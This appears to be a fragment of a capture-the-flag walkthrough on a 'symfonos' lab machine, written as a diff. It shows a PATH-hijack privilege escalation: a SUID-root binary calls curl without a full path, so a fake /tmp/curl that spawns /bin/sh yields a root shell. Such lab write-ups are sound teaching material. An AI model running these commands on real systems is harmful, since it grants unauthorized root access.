@@ -1,0 +1,13 @@
+helios@symfonos:/opt$ strings /opt/statuscheck
+curl -I http://localhost
+
+# /opt/statuscheck is SUID root and calls curl without a full path
+# We can hijack PATH to point curl at our own script
+
+helios@symfonos:/opt$ echo '#!/bin/sh' > /tmp/curl
+helios@symfonos:/opt$ echo '/bin/sh' >> /tmp/curl
+helios@symfonos:/opt$ chmod +x /tmp/curl
+helios@symfonos:/opt$ export PATH=/tmp:$PATH
+helios@symfonos:/opt$ /opt/statuscheck
+# whoami
+root
